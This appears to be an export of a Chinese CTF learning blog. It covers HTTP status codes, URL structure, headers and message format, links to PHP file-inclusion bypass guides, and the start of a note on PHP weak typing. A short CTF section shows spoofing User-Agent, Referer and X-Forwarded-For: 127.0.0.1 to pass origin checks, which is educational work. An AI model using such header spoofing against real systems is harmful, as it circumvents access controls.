<td align="left"><strong>405</strong></td>
<td align="left"><strong>Method Not Allowed</strong></td>
<td align="left"><strong>客户端请求中的方法被禁止</strong></td>
</tr>
<tr>
<td align="left">406</td>
<td align="left">Not Acceptable</td>
<td align="left">服务器无法根据客户端请求的内容特性完成请求</td>
</tr>
<tr>
<td align="left">407</td>
<td align="left">Proxy Authentication Required</td>
<td align="left">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td>
</tr>
<tr>
<td align="left"><strong>408</strong></td>
<td align="left"><strong>Request Time-out</strong></td>
<td align="left"><strong>服务器等待客户端发送的请求时间过长，超时</strong></td>
</tr>
<tr>
<td align="left">409</td>
<td align="left">Conflict</td>
<td align="left">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td>
</tr>
<tr>
<td align="left">410</td>
<td align="left">Gone</td>
<td align="left">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td>
</tr>
<tr>
<td align="left">411</td>
<td align="left">Length Required</td>
<td align="left">服务器无法处理客户端发送的不带Content-Length的请求信息</td>
</tr>
<tr>
<td align="left">412</td>
<td align="left">Precondition Failed</td>
<td align="left">客户端请求信息的先决条件错误</td>
</tr>
<tr>
<td align="left">413</td>
<td align="left">Request Entity Too Large</td>
<td align="left">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td>
</tr>
<tr>
<td align="left">414</td>
<td align="left">Request-URI Too Large</td>
<td align="left">请求的URI过长（URI通常为网址），服务器无法处理</td>
</tr>
<tr>
<td align="left">415</td>
<td align="left">Unsupported Media Type</td>
<td align="left">服务器无法处理请求附带的媒体格式</td>
</tr>
<tr>
<td align="left">416</td>
<td align="left">Requested range not satisfiable</td>
<td align="left">客户端请求的范围无效</td>
</tr>
<tr>
<td align="left">417</td>
<td align="left">Expectation Failed（预期失败）</td>
<td align="left">服务器无法满足请求头中 Expect 字段指定的预期行为。</td>
</tr>
<tr>
<td align="left">418</td>
<td align="left">I’m a teapot</td>
<td align="left">状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。</td>
</tr>
<tr>
<td align="left">500</td>
<td align="left">Internal Server Error</td>
<td align="left">服务器内部错误，无法完成请求</td>
</tr>
<tr>
<td align="left"><strong>501</strong></td>
<td align="left"><strong>Not Implemented</strong></td>
<td align="left"><strong>服务器不支持请求的功能，无法完成请求</strong></td>
</tr>
<tr>
<td align="left"><strong>502</strong></td>
<td align="left"><strong>Bad Gateway</strong></td>
<td align="left"><strong>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</strong></td>
</tr>
<tr>
<td align="left">503</td>
<td align="left">Service Unavailable</td>
<td align="left">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td>
</tr>
<tr>
<td align="left">504</td>
<td align="left">Gateway Time-out</td>
<td align="left">充当网关或代理的服务器，未及时从远端服务器获取请求</td>
</tr>
<tr>
<td align="left">505</td>
<td align="left">HTTP Version not supported</td>
<td align="left">服务器不支持请求的HTTP协议的版本，无法完成处理</td>
</tr>
</tbody></table>
<h3 id="URL组成"><a href="#URL组成" class="headerlink" title="URL组成"></a>URL组成</h3><p>一个标准的URL如下：</p>
<p><a class="link"   href="https://url:80/index.html?a=1&b=2#tag3" >https://url:80/index.html?a=1&amp;b=2#tag3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>包含以下六个部分：</p>
<ol>
<li>协议（Protocol）：表示访问网页时使用的通信协议，常见的有HTTP、HTTPS、FTP等。</li>
<li>域名（Domain Name）：表示网站的名称，是网站在互联网上的唯一标识。域名由多个部分组成，包括主域名和子域名，例如<a class="link"   href="http://www.example.com中的" www"是子域名，"example"是主域名，".com"是顶级域名。顶级域名：也就是后缀，例如.com、.cn等。（备注：域名可以说是一个IP地址的代称，目的是为了便于记忆后者。例如，百度的IP地址是220.181.38.148，域名是baidu.com。人们可以直接通过访问baidu.com来访问，也可以通过IP地址220.181.38.148来访问，但是很明显baidu.com比220.181.38.148容易记忆，因此人们只需要记忆baidu.com这言简意赅的字符，而不需要记忆这种没有含义的数字。）">www.example.com中的&quot;www&quot;是子域名，&quot;example&quot;是主域名，&quot;.com&quot;是顶级域名。顶级域名：也就是后缀，例如.com、.cn等。（备注：域名可以说是一个IP地址的代称，目的是为了便于记忆后者。例如，百度的IP地址是220.181.38.148，域名是baidu.com。人们可以直接通过访问baidu.com来访问，也可以通过IP地址220.181.38.148来访问，但是很明显baidu.com比220.181.38.148容易记忆，因此人们只需要记忆baidu.com这言简意赅的字符，而不需要记忆这种没有含义的数字。） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>端口号（Port）：表示用于访问网站的端口号，默认为80。例如，<a href="http://www.example.com:8080中的"8080"就是端口号。端口号的范围是：0~65535">http://www.example.com:8080中的&quot;8080&quot;就是端口号。端口号的范围是：0~65535</a></li>
<li>路径（Path）：表示网站上具体的文件或目录路径。例如，<a class="link"   href="http://www.example.com/path/to/file%E4%B8%AD%E7%9A%84%22/path/to/file%22%E5%B0%B1%E6%98%AF%E8%B7%AF%E5%BE%84%EF%BC%88%E7%BD%91%E5%9D%80%E5%8F%AF%E4%BB%A5%E6%B2%A1%E6%9C%89%E7%AB%AF%E5%8F%A3%E5%8F%B7%EF%BC%89%E3%80%82" >http://www.example.com/path/to/file中的&quot;/path/to/file&quot;就是路径（网址可以没有端口号）。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>查询参数（Query Parameters）：表示向服务器传递的参数，用于定制请求的内容。查询参数以”?”开头，多个参数之间使用”&amp;”分隔。例如，<a class="link"   href="http://www.example.com/path/to/file?param1=value1&param2=value2%E4%B8%AD%E7%9A%84%22param1=value1&param2=value2%22%E5%B0%B1%E6%98%AF%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0%EF%BC%8C%E8%BF%99%E7%A7%8D%E5%B8%B8%E8%A7%81%E4%BA%8E%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%B7%AF%E7%94%B1%E8%B7%B3%E8%BD%AC%E7%9A%84%E4%BC%A0%E5%8F%82%E3%80%81get%E8%AF%B7%E6%B1%82%E7%AD%89%E3%80%82" >http://www.example.com/path/to/file?param1=value1&amp;param2=value2中的&quot;param1=value1&amp;param2=value2&quot;就是查询参数，这种常见于项目中路由跳转的传参、get请求等。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>锚点（Anchor）：表示网页内部的定位点。锚点以”#”开头，用于跳转到网页的特定位置。例如，<a class="link"   href="http://www.example.com/path/to/file#section1%E4%B8%AD%E7%9A%84%22#section1%22%E5%B0%B1%E6%98%AF%E9%94%9A%E7%82%B9%EF%BC%8C%E5%B8%B8%E8%A7%81%E4%BA%8Ea%E6%A0%87%E7%AD%BE%E7%9A%84%E8%B6%85%E9%93%BE%E6%8E%A5%E3%80%82" >http://www.example.com/path/to/file#section1中的&quot;#section1&quot;就是锚点，常见于a标签的超链接。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ol>
<h3 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h3><p><strong>URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。</strong></p>
<p>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的</p>
<p>URI一般由三部组成：<br>①访问资源的命名机制<br>②存放资源的主机名<br>③资源自身的名称，由路径表示，着重强调于资源。</p>
<p><strong>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</strong></p>
<p>URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。</p>
<p>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：<br>①协议(或称为服务方式)<br>②存有该资源的主机IP地址(有时也包括端口号)<br>③主机资源的具体地址。如目录和文件名等</p>
<p><strong>URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:<a class="link"   href="mailto:&#106;&#x61;&#x76;&#97;&#45;&#x6e;&#x65;&#116;&#x40;&#106;&#x61;&#x76;&#x61;&#x2e;&#x73;&#117;&#x6e;&#46;&#99;&#x6f;&#x6d;" >&#106;&#x61;&#x76;&#97;&#45;&#x6e;&#x65;&#116;&#x40;&#106;&#x61;&#x76;&#x61;&#x2e;&#x73;&#117;&#x6e;&#46;&#99;&#x6f;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</strong></p>
<p>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。</p>
<p>在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。</p>
<p>在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。<br>相反的是，URL类可以打开一个到达资源的流。</p>
<h3 id="HTTP-响应头信息"><a href="#HTTP-响应头信息" class="headerlink" title="HTTP 响应头信息"></a>HTTP 响应头信息</h3><p>HTTP 响应头信息是服务器在响应客户端的HTTP请求时发送的一系列头字段，它们提供了关于响应的附加信息和服务器的指令。</p>
<p>以下是一些常见的 HTTP 响应头信息：</p>
<table>
<thead>
<tr>
<th align="left">响应头信息（英文）</th>
<th align="left">响应头信息（中文）</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>Date</strong></td>
<td align="left">日期</td>
<td align="left">响应生成的日期和时间。例如：Wed, 18 Apr 2024 12:00:00 GMT</td>
</tr>
<tr>
<td align="left"><strong>Server</strong></td>
<td align="left">服务器</td>
<td align="left">服务器软件的名称和版本。例如：Apache&#x2F;2.4.1 (Unix)</td>
</tr>
<tr>
<td align="left"><strong>Content-Type</strong></td>
<td align="left">内容类型</td>
<td align="left">响应体的媒体类型（MIME类型），如<code>text/html; charset=UTF-8</code>, <code>application/json</code>等。</td>
</tr>
<tr>
<td align="left"><strong>Content-Length</strong></td>
<td align="left">内容长度</td>
<td align="left">响应体的大小，单位是字节。例如：3145</td>
</tr>
<tr>
<td align="left">Content-Encoding</td>
<td align="left">内容编码</td>
<td align="left">响应体的压缩编码，如 <code>gzip</code>, <code>deflate</code>等。</td>
</tr>
<tr>
<td align="left"><strong>Content-Language</strong></td>
<td align="left">内容语言</td>
<td align="left">响应体的语言。例如：zh-CN</td>
</tr>
<tr>
<td align="left">Content-Location</td>
<td align="left">内容位置</td>
<td align="left">响应体的 URI。例如：&#x2F;index.html</td>
</tr>
<tr>
<td align="left">Content-Range</td>
<td align="left">内容范围</td>
<td align="left">响应体的字节范围，用于分块传输。例如：bytes 0-999&#x2F;8000</td>
</tr>
<tr>
<td align="left">Cache-Control</td>
<td align="left">缓存控制</td>
<td align="left">控制响应的缓存行为, 如 no-cache 表示必须重新请求。</td>
</tr>
<tr>
<td align="left"><strong>Connection</strong></td>
<td align="left">连接</td>
<td align="left">管理连接的选项，如<code>keep-alive</code>或<code>close</code>，keep-alive 表示连接不会在传输后关闭。。</td>
</tr>
<tr>
<td align="left"><strong>Set-Cookie</strong></td>
<td align="left">设置 Cookie</td>
<td align="left">设置客户端的 cookie。例如：sessionId&#x3D;abc123; Path&#x3D;&#x2F;; Secure</td>
</tr>
<tr>
<td align="left">Expires</td>
<td align="left">过期时间</td>
<td align="left">响应体的过期日期和时间。例如：Thu, 18 Apr 2024 12:00:00 GMT</td>
</tr>
<tr>
<td align="left">Last-Modified</td>
<td align="left">最后修改时间</td>
<td align="left">资源最后被修改的日期和时间。例如：Wed, 18 Apr 2024 11:00:00 GMT</td>
</tr>
<tr>
<td align="left">ETag</td>
<td align="left">实体标签</td>
<td align="left">资源的特定版本的标识符。例如：”33a64df551425fcc55e6”</td>
</tr>
<tr>
<td align="left"><strong>Location</strong></td>
<td align="left">位置</td>
<td align="left">用于重定向的 URI。例如：&#x2F;newresource</td>
</tr>
<tr>
<td align="left">Pragma</td>
<td align="left">实现特定的指令</td>
<td align="left">包含实现特定的指令，如 <code>no-cache</code>。</td>
</tr>
<tr>
<td align="left">WWW-Authenticate</td>
<td align="left">认证信息</td>
<td align="left">认证信息，通常用于HTTP认证。例如：Basic realm&#x3D;”Access to the site”</td>
</tr>
<tr>
<td align="left">Accept-Ranges</td>
<td align="left">接受范围</td>
<td align="left">指定可接受的请求范围类型。例如：bytes</td>
</tr>
<tr>
<td align="left">Age</td>
<td align="left">经过时间</td>
<td align="left">响应生成后经过的秒数，从原始服务器生成到代理服务器。例如：24</td>
</tr>
<tr>
<td align="left">Allow</td>
<td align="left">允许方法</td>
<td align="left">列出资源允许的 HTTP 方法 。例如：GET, POST，HEAD等</td>
</tr>
<tr>
<td align="left">Vary</td>
<td align="left">变化</td>
<td align="left">告诉下游代理如何使用响应头信息来确定响应是否可以从缓存中获取。例如：Accept</td>
</tr>
<tr>
<td align="left">Strict-Transport-Security</td>
<td align="left">严格传输安全</td>
<td align="left">指示浏览器仅通过 HTTPS 与服务器通信。例如：max-age&#x3D;31536000; includeSubDomains</td>
</tr>
<tr>
<td align="left">X-Frame-Options</td>
<td align="left">框架选项</td>
<td align="left">控制页面是否允许在框架中显示，防止点击劫持攻击。例如：SAMEORIGIN</td>
</tr>
<tr>
<td align="left">X-Content-Type-Options</td>
<td align="left">内容类型选项</td>
<td align="left">指示浏览器不要尝试猜测资源的 MIME 类型。例如：nosniff</td>
</tr>
<tr>
<td align="left">X-XSS-Protection</td>
<td align="left">XSS保护</td>
<td align="left">控制浏览器的 XSS 过滤和阻断。例如：1; mode&#x3D;block</td>
</tr>
<tr>
<td align="left">Public-Key-Pins</td>
<td align="left">公钥固定</td>
<td align="left">HTTP 头信息，用于HTTP公共密钥固定（HPKP），一种安全机制，用于防止中间人攻击。例如：pin-sha256&#x3D;”base64+primarykey”; pin-sha256&#x3D;”base64+backupkey”; max-age&#x3D;expireTime</td>
</tr>
</tbody></table>
<p>这些响应头信息在实际的 HTTP 响应中可能会有所不同，具体值取决于服务器的配置和处理逻辑。</p>
<h3 id="HTTP-消息结构"><a href="#HTTP-消息结构" class="headerlink" title="HTTP 消息结构"></a>HTTP 消息结构</h3><p>HTTP 是基于客户端&#x2F;服务端（C&#x2F;S）的架构模型，通过一个可靠的链接来交换信息，是一个无状态的请求&#x2F;响应协议。</p>
<p>HTTP 消息是客户端和服务器之间通信的基础，它们由一系列的文本行组成，遵循特定的格式和结构。</p>
<p>HTTP消息分为两种类型：请求消息和响应消息。</p>
<p>一个 HTTP 客户端是一个应用程序（Web 浏览器或其他任何客户端），通过连接到服务器达到向服务器发送一个或多个 HTTP 的请求的目的。</p>
<p>一个 HTTP 服务器 同样也是一个应用程序（通常是一个 Web 服务，如 Nginx、Apache 服务器或 IIS 服务器等），通过接收客户端的请求并向客户端发送 HTTP 响应数据。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/HTTP/231-O-Que-E-Request-E-Response-02.jpg"
                      alt="img"
                ></p>
<hr>
<h4 id="客户端请求消息"><a href="#客户端请求消息" class="headerlink" title="客户端请求消息"></a>客户端请求消息</h4><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：请求行（request line）、请求头部（header）、空行和请求数据四个部分组成，下图给出了请求报文的一般格式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/HTTP/2012072810301161.png"
                      alt="img"
                ></p>
<ul>
<li><p><strong>请求行</strong>（Request Line）：</p>
<ul>
<li><strong>方法</strong>：如 GET、POST、PUT、DELETE等，指定要执行的操作。</li>
<li><strong>请求 URI</strong>（统一资源标识符）：请求的资源路径，通常包括主机名、端口号（如果非默认）、路径和查询字符串。</li>
<li><strong>HTTP 版本</strong>：如 HTTP&#x2F;1.1 或 HTTP&#x2F;2。</li>
</ul>
<p>请求行的格式示例：<code>GET /index.html HTTP/1.1</code></p>
</li>
<li><p><strong>请求头</strong>（Request Headers）：</p>
<ul>
<li>包含了客户端环境信息、请求体的大小（如果有）、客户端支持的压缩类型等。</li>
<li>常见的请求头包括<code>Host</code>、<code>User-Agent</code>、<code>Accept</code>、<code>Accept-Encoding</code>、<code>Content-Length</code>等。</li>
</ul>
</li>
<li><p><strong>空行</strong>：</p>
<ul>
<li>请求头和请求体之间的分隔符，表示请求头的结束。</li>
</ul>
</li>
<li><p><strong>请求体</strong>（可选）：</p>
<ul>
<li>在某些类型的HTTP请求（如 POST 和 PUT）中，请求体包含要发送给服务器的数据。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="服务器响应消息"><a href="#服务器响应消息" class="headerlink" title="服务器响应消息"></a>服务器响应消息</h4><p>HTTP 响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/HTTP/httpmessage.jpg"
                      alt="img"
                ></p>
<ul>
<li><p><strong>状态行</strong>（Status Line）：</p>
<ul>
<li><strong>HTTP 版本</strong>：与请求消息中的版本相匹配。</li>
<li><strong>状态码</strong>：三位数，表示请求的处理结果，如 200 表示成功，404 表示未找到资源。</li>
<li><strong>状态信息</strong>：状态码的简短描述。</li>
</ul>
<p>状态行的格式示例：<code>HTTP/1.1 200 OK</code></p>
</li>
<li><p><strong>响应头</strong>（Response Headers）：</p>
<ul>
<li>包含了服务器环境信息、响应体的大小、服务器支持的压缩类型等。</li>
<li>常见的响应头包括<code>Content-Type</code>、<code>Content-Length</code>、<code>Server</code>、<code>Set-Cookie</code>等。</li>
</ul>
</li>
<li><p><strong>空行</strong>：</p>
<ul>
<li>响应头和响应体之间的分隔符，表示响应头的结束。</li>
</ul>
</li>
<li><p><strong>响应体</strong>（可选）：</p>
<ul>
<li>包含服务器返回的数据，如请求的网页内容、图片、JSON数据等。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>下面实例是一点典型的使用 GET 来传递数据的实例：</p>
<p>客户端请求：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure></div>

<p>服务端响应:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 18 Apr 2024 12:00:00 GMT</span><br><span class="line">Server: Apache/2.4.1 (Unix)</span><br><span class="line">Last-Modified: Wed, 18 Apr 2024 11:00:00 GMT</span><br><span class="line">Content-Length: 12345</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Example Page&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello, World!&lt;/h1&gt;</span><br><span class="line">    &lt;!-- The rest of the HTML content --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>在实际应用中，HTTP 消息可以包含更多的头字段，并且请求体和响应体的大小会根据传输的数据而变化。</p>
<h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><h3 id="伪造UA访问"><a href="#伪造UA访问" class="headerlink" title="伪造UA访问"></a>伪造UA访问</h3><p>伪造系统及浏览器访问来源，顺应题目中的从固定浏览器访问</p>
<p>修改<code>User-Agent</code>值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br></pre></td></tr></table></figure></div>

<p>改为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Chrome/91.0</span><br></pre></td></tr></table></figure></div>

<p>成功伪造为谷歌浏览器访问</p>
<h3 id="伪造Referer访问"><a href="#伪造Referer访问" class="headerlink" title="伪造Referer访问"></a>伪造Referer访问</h3><p>伪造浏览器网页访问来源</p>
<p>修改或添加<code>Referer</code>值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer:https://www.google.com/</span><br></pre></td></tr></table></figure></div>

<h3 id="伪造IP访问"><a href="#伪造IP访问" class="headerlink" title="伪造IP访问"></a>伪造IP访问</h3><p>伪造IP访问，顺应题目中需要本地访问的</p>
<p>修改或添加<code>X-Forwarded-For</code>或<code>X-Client</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure></div>

<h3 id="伪造请求方法"><a href="#伪造请求方法" class="headerlink" title="伪造请求方法"></a>伪造请求方法</h3><p>修改HTTP请求方式</p>
<p>将GET修改为POST（具体根据题目来定）</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://www.runoob.com/http/http-tutorial.html" >HTTP 教程|菜鸟教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_39805338/article/details/80810379#:~:text=HTTP%E5%8D%8F%E8%AE%AE%E6%98%AFHyp#:~:text=HTTP%E5%8D%8F%E8%AE%AE%E6%98%AFHyp" >HTTP协议、URL、URI、请求响应—讲解很详细|CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全学习资料博客文推荐</title>
    <url>/2024/09/14/ctf/data/web/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E5%8D%9A%E5%AE%A2%E6%96%87%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<h1 id="web学习资料博客文推荐"><a href="#web学习资料博客文推荐" class="headerlink" title="web学习资料博客文推荐"></a>web学习资料博客文推荐</h1><p>web安全里面有很多各种各样的ctf习题，在遇到一些不会的题的时候往往会去网上查资料，这里盘点了一些做题时遇得到的知识点，可以结合网上资料一起再整理自己的笔记，毕竟自己记过一遍也会更有印象</p>
<h2 id="PHP文件包含漏洞思路与Bypass总结"><a href="#PHP文件包含漏洞思路与Bypass总结" class="headerlink" title="PHP文件包含漏洞思路与Bypass总结"></a>PHP文件包含漏洞思路与Bypass总结</h2><ol>
<li><a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/105839776" >PHP文件包含漏洞利用思路与Bypass总结手册（一） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/106330268?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522A78DF7D0-FFA4-48BA-80E6-B49EF580AC22%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=A78DF7D0-FFA4-48BA-80E6-B49EF580AC22&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-106330268-null-null.nonecase&utm_term=PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%8EBypass%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C&spm=1018.2226.3001.4450" >PHP文件包含漏洞利用思路与Bypass总结手册（二） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/106330277?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522A78DF7D0-FFA4-48BA-80E6-B49EF580AC22%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=A78DF7D0-FFA4-48BA-80E6-B49EF580AC22&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-106330277-null-null.nonecase&utm_term=PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%8EBypass%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C&spm=1018.2226.3001.4450" >PHP文件包含漏洞利用思路与Bypass总结手册（三） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/106205539?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522A78DF7D0-FFA4-48BA-80E6-B49EF580AC22%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=A78DF7D0-FFA4-48BA-80E6-B49EF580AC22&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-106205539-null-null.nonecase&utm_term=PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%8EBypass%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C&spm=1018.2226.3001.4450" >PHP文件包含漏洞利用思路与Bypass总结手册（完结） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP相关知识</title>
    <url>/2024/09/26/ctf/data/web/PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="PHP相关知识"><a href="#PHP相关知识" class="headerlink" title="PHP相关知识"></a>PHP相关知识</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里会提供一些来自buuctf的案例，有需要还原的可以看我的博客的关于这一节的题目</p>
<a href="/2024/09/12/ctf/writeup/web/%E7%9B%AE%E5%BD%95/catalogue/" title="web安全WP目录">参考题目目录</a>

<h2 id="PHP的弱类型特征"><a href="#PHP的弱类型特征" class="headerlink" title="PHP的弱类型特征"></a>PHP的弱类型特征</h2><h3 id="强类型与弱类型"><a href="#强类型与弱类型" class="headerlink" title="强类型与弱类型"></a>强类型与弱类型</h3><p>强类型语言——Python&#x2F;Java等</p>
<p>弱类型语言——PHP&#x2F;JavaScript等</p>
<p>强类型语言不会根据条件“随机应变”，而弱类型会</p>
<p>比如案例 <code>&#39;1&#39;+1=?</code></p>
<p>对于强类型会直接报错，而对于弱类型来说会“随机应变”，以PHP来说，对于这类会将字符串转换位整型然后进行数字运算</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;1test&#x27;-&gt;1;&#x27;test&#x27;-&gt;0</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/image-20240927010345310.png"
                      alt="image-20240927010345310"
                ></p>
<p>若是拼接操作则会将所有类型转换位Str类型进行拼接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/image-20240927010520867.png"
                      alt="image-20240927010520867"
                ></p>
<h3 id="弱类型漏洞原理"><a href="#弱类型漏洞原理" class="headerlink" title="弱类型漏洞原理"></a>弱类型漏洞原理</h3><p><strong>由于PHP的弱类型类型转换，当遇到<code>1==‘admin’</code>，当<code>admin</code>为<code>1test</code>时，发生类型转换，则会判断条件成立</strong></p>
<h3 id="MD5、HASH加密相关漏洞利用"><a href="#MD5、HASH加密相关漏洞利用" class="headerlink" title="MD5、HASH加密相关漏洞利用"></a>MD5、HASH加密相关漏洞利用</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
